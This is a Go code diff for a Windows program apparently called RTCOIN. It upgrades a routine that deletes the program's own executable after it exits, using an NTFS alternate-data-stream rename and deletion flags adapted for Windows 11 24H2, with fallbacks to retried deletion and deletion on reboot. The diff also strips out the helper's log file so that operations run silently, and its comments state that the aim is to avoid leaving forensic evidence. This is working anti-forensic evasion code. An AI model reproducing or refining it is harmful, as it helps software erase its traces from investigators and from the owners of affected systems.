@@ -34,8 +34,44 @@ const (
 
 	// FileDispositionInfo is the Windows FileInformationClass value for
 	// marking files for deletion. When set, the file is deleted when all
-	// handles are closed.
+	// handles are closed. (Legacy API, pre-Windows 11 24H2)
 	FileDispositionInfo = 4
+
+	// FileDispositionInfoEx is the Windows FileInformationClass value for
+	// marking files for deletion using extended disposition flags. This is
+	// required for Windows 11 24H2 and later to enable POSIX deletion semantics.
+	FileDispositionInfoEx = 21
+
+	// FILE_DISPOSITION_FLAG_DELETE indicates the file should be deleted when
+	// all handles are closed. Used with FileDispositionInfoEx.
+	FILE_DISPOSITION_FLAG_DELETE = 0x1
+
+	// FILE_DISPOSITION_FLAG_POSIX_SEMANTICS enables POSIX-style deletion where
+	// the file is unlinked immediately when the handle closes, even if the file
+	// is memory-mapped or has open handles. Required for Windows 11 24H2.
+	FILE_DISPOSITION_FLAG_POSIX_SEMANTICS = 0x2
+
+	// INFINITE represents an infinite timeout for Windows wait operations.
+	// Used with WaitForSingleObject to wait indefinitely for process termination.
+	INFINITE = 0xFFFFFFFF
+
+	// maxDeletionRetries is the maximum number of retry attempts for file deletion.
+	maxDeletionRetries = 10
+
+	// baseDeletionBackoff is the base delay for exponential backoff during deletion retries.
+	// Actual delays will be: 50ms, 100ms, 200ms, 400ms, ...
+	baseDeletionBackoff = 50 * time.Millisecond
+
+	// MOVEFILE_DELAY_UNTIL_REBOOT is the Windows flag for MoveFileEx to schedule
+	// file deletion on next system reboot.
+	MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
+)
+
+var (
+	// debugMode controls whether debug logging is enabled for self-deletion operations.
+	// Set via RTCOIN_DEBUG environment variable. Useful during development and testing
+	// but should remain disabled in production to avoid forensic evidence.
+	debugMode = os.Getenv("RTCOIN_DEBUG") == "1"
 )
 
 // FILE_RENAME_INFO represents the Windows FILE_RENAME_INFO structure used
@@ -52,8 +88,17 @@ type FILE_RENAME_INFO struct {
 // FILE_DISPOSITION_INFO represents the Windows FILE_DISPOSITION_INFO
 // structure used with SetFileInformationByHandle to mark files for deletion.
 // When DeleteFile is set to 1, the file is deleted when all handles close.
+// This is the legacy structure for Windows versions prior to 11 24H2.
 type FILE_DISPOSITION_INFO struct {
 	DeleteFile uint32
+}
+
+// FILE_DISPOSITION_INFO_EX represents the Windows FILE_DISPOSITION_INFORMATION_EX
+// structure used with SetFileInformationByHandle for extended deletion control.
+// The Flags field accepts FILE_DISPOSITION_FLAG_DELETE and
+// FILE_DISPOSITION_FLAG_POSIX_SEMANTICS for Windows 11 24H2+ compatibility.
+type FILE_DISPOSITION_INFO_EX struct {
+	Flags uint32
 }
 
 var (
@@ -62,6 +107,38 @@ var (
 	ntdll                          = windows.NewLazySystemDLL("ntdll.dll")
 	procRtlCopyMemory              = ntdll.NewProc("RtlCopyMemory")
 )
+
+// debugLog logs a message only when debug mode is enabled via RTCOIN_DEBUG=1.
+// This allows detailed logging during development and testing without leaving
+// forensic evidence in production deployments.
+func debugLog(format string, v ...interface{}) {
+	if debugMode {
+		log.Printf("[DEBUG] "+format, v...)
+	}
+}
+
+// retryWithExponentialBackoff executes the given operation with exponential backoff
+// retry logic. It will retry up to maxRetries times, waiting baseDelay * 2^attempt
+// between each retry. Returns nil if the operation succeeds, or the last error if
+// all retries are exhausted.
+func retryWithExponentialBackoff(operation func() error, maxRetries int, baseDelay time.Duration) error {
+	var lastErr error
+	for i := 0; i < maxRetries; i++ {
+		if err := operation(); err == nil {
+			return nil
+		} else {
+			lastErr = err
+			debugLog("retry attempt %d/%d failed: %v", i+1, maxRetries, err)
+		}
+
+		if i < maxRetries-1 {
+			waitTime := baseDelay * time.Duration(1<<uint(i))
+			debugLog("waiting %v before retry %d", waitTime, i+2)
+			time.Sleep(waitTime)
+		}
+	}
+	return lastErr
+}
 
 // deleteSelf removes the executable at path using Windows-specific deletion
 // techniques. It first attempts the advanced NTFS stream method; if that fails,
@@ -217,16 +294,40 @@ func renameToADS(handle windows.Handle) error {
 }
 
 // markForDeletion sets the deletion disposition on the file handle using
-// SetFileInformationByHandle with FileDispositionInfo. When DeleteFile is
-// set to 1, Windows marks the file for deletion when all handles are closed.
-// This is the final step in the advanced deletion technique. Returns an error
-// if the operation fails.
+// SetFileInformationByHandle. First attempts the Windows 11 24H2+ method using
+// FileDispositionInfoEx with POSIX semantics, which enables immediate file
+// unlinking even for memory-mapped files. Falls back to the legacy
+// FileDispositionInfo API for older Windows versions. Returns an error if both
+// methods fail.
 func markForDeletion(handle windows.Handle) error {
+	// Try Windows 11 24H2+ method first: FileDispositionInfoEx with POSIX semantics
+	// This works around the 24H2 NTFS driver changes that broke the old technique
+	dispInfoEx := FILE_DISPOSITION_INFO_EX{
+		Flags: FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS,
+	}
+
+	debugLog("trying FileDispositionInfoEx with POSIX semantics")
+	ret, _, err := procSetFileInformationByHandle.Call(
+		uintptr(handle),
+		uintptr(FileDispositionInfoEx),
+		uintptr(unsafe.Pointer(&dispInfoEx)), // nosemgrep: go.lang.security.audit.unsafe.use-of-unsafe-block
+		uintptr(unsafe.Sizeof(dispInfoEx)),   // nosemgrep: go.lang.security.audit.unsafe.use-of-unsafe-block
+	)
+
+	if ret != 0 {
+		debugLog("FileDispositionInfoEx succeeded")
+		return nil
+	}
+
+	debugLog("FileDispositionInfoEx failed: %v, falling back to legacy API", err)
+
+	// Fallback to legacy method for older Windows versions (pre-24H2)
 	dispInfo := FILE_DISPOSITION_INFO{
 		DeleteFile: 1,
 	}
 
-	ret, _, err := procSetFileInformationByHandle.Call(
+	debugLog("trying FileDispositionInfo (legacy)")
+	ret, _, err = procSetFileInformationByHandle.Call(
 		uintptr(handle),
 		uintptr(FileDispositionInfo),
 		uintptr(unsafe.Pointer(&dispInfo)), // nosemgrep: go.lang.security.audit.unsafe.use-of-unsafe-block
@@ -234,121 +335,110 @@ func markForDeletion(handle windows.Handle) error {
 	)
 
 	if ret == 0 {
+		debugLog("FileDispositionInfo failed: %v", err)
 		return err
 	}
 
+	debugLog("FileDispositionInfo succeeded")
 	return nil
 }
 
 // runDeletionHelper is the helper process entry point that waits for the
 // parent process (identified by pid) to exit, then deletes the executable
-// at path. It polls the parent process every 100ms until it's no longer
-// accessible, waits an additional 500ms for handle release, then performs
-// the deletion. This function is invoked when the program is launched with
-// the --delete-helper flag.
+// at path. It waits for process termination, pauses for handle release, then
+// performs the deletion. This function is invoked when the program is launched
+// with the --delete-helper flag. Operations are silent by default but can be
+// logged via RTCOIN_DEBUG=1 environment variable.
 func runDeletionHelper(pidStr, path string) {
-	logFile, err := os.OpenFile(path+".deletion.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
-	if err != nil {
-		return
-	}
-	defer logFile.Close()
-
-	logger := log.New(logFile, "", log.LstdFlags)
-	logger.Printf("Deletion helper started for PID %s, path %s", pidStr, path)
+	debugLog("helper: starting deletion helper for PID %s, path %s", pidStr, path)
 
 	pid, err := strconv.Atoi(pidStr)
 	if err != nil {
-		logger.Printf("Failed to parse PID: %v", err)
+		debugLog("helper: invalid PID %q: %v", pidStr, err)
 		return
 	}
 
-	logger.Printf("Waiting for parent process %d to exit...", pid)
 	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.SYNCHRONIZE, false, uint32(pid))
 	if err != nil {
-		logger.Printf("Failed to open parent process: %v", err)
+		debugLog("helper: failed to open process %d: %v", pid, err)
 		return
 	}
 	defer windows.CloseHandle(handle)
 
 	// Use WaitForSingleObject to efficiently wait for process termination
-	const INFINITE = 0xFFFFFFFF
-	logger.Printf("Waiting for process object to be signaled...")
-	ret, err := windows.WaitForSingleObject(handle, INFINITE)
-	if ret == windows.WAIT_OBJECT_0 {
-		logger.Printf("Parent process exited (process object signaled)")
-	} else {
-		logger.Printf("Wait failed: ret=%d, err=%v", ret, err)
+	debugLog("helper: waiting for process %d to exit", pid)
+	ret, _ := windows.WaitForSingleObject(handle, INFINITE)
+	if ret != windows.WAIT_OBJECT_0 {
+		debugLog("helper: wait failed with return code %d", ret)
 		return
 	}
 
-	logger.Printf("Parent exited, waiting for file handles to release...")
+	debugLog("helper: process exited, waiting for handle release")
 	time.Sleep(500 * time.Millisecond)
 
-	logger.Printf("Attempting to delete %s using advanced technique", path)
-
 	// Try advanced NTFS deletion first (rename to ADS + mark for deletion)
+	debugLog("helper: attempting advanced deletion for %s", path)
 	fileHandle, err := openHandleForDeletion(path)
 	if err != nil {
-		logger.Printf("Failed to open file for deletion: %v", err)
+		debugLog("helper: failed to open handle for deletion: %v", err)
+		attemptFallbackDeletion(path)
 		return
 	}
 	defer windows.CloseHandle(fileHandle)
 
-	logger.Printf("Successfully opened file handle for deletion")
-
 	err = renameToADS(fileHandle)
 	if err != nil {
-		logger.Printf("Failed to rename to ADS: %v, trying direct deletion", err)
+		debugLog("helper: failed to rename to ADS: %v", err)
 		windows.CloseHandle(fileHandle)
-
-		// Fallback to simple deletion with retry
-		maxRetries := 10
-		for i := 0; i < maxRetries; i++ {
-			pathPtr, err := windows.UTF16PtrFromString(path)
-			if err != nil {
-				logger.Printf("Failed to convert path to UTF16: %v", err)
-				return
-			}
-
-			err = windows.DeleteFile(pathPtr)
-			if err == nil {
-				logger.Printf("Successfully deleted %s using DeleteFile on attempt %d", path, i+1)
-				return
-			}
-
-			if i < maxRetries-1 {
-				waitTime := time.Duration(50*(1<<uint(i))) * time.Millisecond
-				logger.Printf("DeleteFile attempt %d failed: %v, retrying in %v...", i+1, err, waitTime)
-				time.Sleep(waitTime)
-			} else {
-				logger.Printf("DeleteFile failed after %d attempts: %v", maxRetries, err)
-			}
-		}
-
-		// Final fallback: mark for deletion on reboot
-		logger.Printf("All deletion attempts failed, marking for deletion on reboot...")
-		pathPtr, err := windows.UTF16PtrFromString(path)
-		if err != nil {
-			logger.Printf("Failed to convert path for MoveFileEx: %v", err)
-			return
-		}
-
-		const MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
-		err = windows.MoveFileEx(pathPtr, nil, MOVEFILE_DELAY_UNTIL_REBOOT)
-		if err != nil {
-			logger.Printf("MoveFileEx DELAY_UNTIL_REBOOT failed: %v", err)
-			return
-		}
-		logger.Printf("Successfully marked %s for deletion on next reboot", path)
+		attemptFallbackDeletion(path)
 		return
 	}
 
-	logger.Printf("Successfully renamed to ADS, marking for deletion")
 	err = markForDeletion(fileHandle)
 	if err != nil {
-		logger.Printf("Failed to mark for deletion: %v", err)
+		debugLog("helper: failed to mark for deletion: %v", err)
+		windows.CloseHandle(fileHandle)
+		attemptFallbackDeletion(path)
 		return
 	}
 
-	logger.Printf("Successfully marked %s for deletion", path)
+	debugLog("helper: successfully marked file for deletion")
+}
+
+// attemptFallbackDeletion tries to delete the file using simpler methods when
+// advanced techniques fail. First attempts DeleteFile with exponential backoff
+// retry, then marks for deletion on reboot as a last resort.
+func attemptFallbackDeletion(path string) {
+	debugLog("attempting fallback deletion for %s", path)
+
+	// Attempt simple deletion with retry and exponential backoff
+	err := retryWithExponentialBackoff(func() error {
+		pathPtr, err := windows.UTF16PtrFromString(path)
+		if err != nil {
+			return err
+		}
+		return windows.DeleteFile(pathPtr)
+	}, maxDeletionRetries, baseDeletionBackoff)
+
+	if err == nil {
+		debugLog("fallback deletion succeeded for %s", path)
+		return
+	}
+
+	debugLog("fallback deletion failed after retries: %v, scheduling deletion on reboot", err)
+
+	// Final fallback: mark for deletion on reboot
+	pathPtr, err := windows.UTF16PtrFromString(path)
+	if err != nil {
+		debugLog("failed to convert path for reboot deletion: %v", err)
+		return
+	}
+
+	err = windows.MoveFileEx(pathPtr, nil, MOVEFILE_DELAY_UNTIL_REBOOT)
+	if err != nil {
+		debugLog("failed to schedule deletion on reboot: %v", err)
+		return
+	}
+
+	debugLog("file scheduled for deletion on next reboot")
 }
